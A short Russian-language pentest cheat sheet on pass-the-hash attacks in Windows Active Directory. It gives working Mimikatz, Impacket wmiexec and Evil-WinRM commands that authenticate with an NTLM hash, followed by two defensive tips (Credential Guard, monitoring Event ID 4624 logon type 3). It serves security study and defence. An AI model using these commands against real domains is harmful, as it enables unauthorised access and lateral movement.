#windows #AD #attacks 

> Нужен только NTLM хэш пользователя
## Mimikatz
```mimikatz
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:e45a314c664d40a227f9540121d1a29d /run:cmd.exe
```

# Impacket 
```bash
python3 wmiexec.py -hashes :<NTLM_hash> corp.local/Administrator@TARGET_IP
```


# Evil-WinRM
```bash
evil-winrm -i <IP> -u <user> -H <NTLM hash>
```

# Защита 

1) Включить Credential Guard для изоляции процесса LSASS
2) Мониторить события **Event ID 4624** с **LogonType = 3 (Network)**